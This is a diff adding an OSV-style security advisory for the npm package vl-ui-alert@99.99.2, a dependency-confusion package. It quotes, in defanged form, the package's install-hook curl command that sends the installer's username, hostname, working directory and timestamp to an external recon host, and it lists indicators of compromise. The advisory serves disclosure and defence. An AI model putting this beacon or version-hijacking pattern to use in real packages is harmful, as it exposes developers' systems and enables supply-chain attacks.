@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-5434",
+  "modified": "2026-06-15T20:59:47Z",
+  "published": "2026-06-15T20:58:31Z",
+  "summary": "Malicious code in vl-ui-alert (npm)",
+  "details": "Dependency-confusion package vl-ui-alert@99.99.2 that beacons host metadata on install. The package contains no functional code (index.js is a single-line comment only). Both preinstall and postinstall hooks execute: curl -s \"hxxps://178fx66q[.]instances[.]httpworkbench[.]com/depconf/?pkg=vl-ui-alert\u0026u=$(whoami)\u0026h=$(hostname)\u0026d=$PWD\u0026t=$(date +%s)\" \u003e /dev/null || true. This exfiltrates the installer's username, hostname, current working directory, and timestamp to an external recon panel at 178fx66q[.]instances[.]httpworkbench[.]com. The /depconf/ path segment suggests the server is collecting dependency-confusion victims. The version is set to 99.99.2 to hijack npm version resolution over any legitimate version of vl-ui-alert.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "vl-ui-alert",
+        "purl": "pkg:npm/vl-ui-alert@99.99.2"
+      },
+      "versions": [
+        "99.99.2"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/vl-ui-alert/v/99.99.2"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-5434"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "dependency_confusion",
+      "first_seen_at": "2026-06-15T20:58:31Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "178fx66q[.]instances[.]httpworkbench[.]com"
+        ],
+        "url_observed": [
+          "hxxps://178fx66q[.]instances[.]httpworkbench[.]com/depconf/"
+        ]
+      }
+    }
+  }
+}
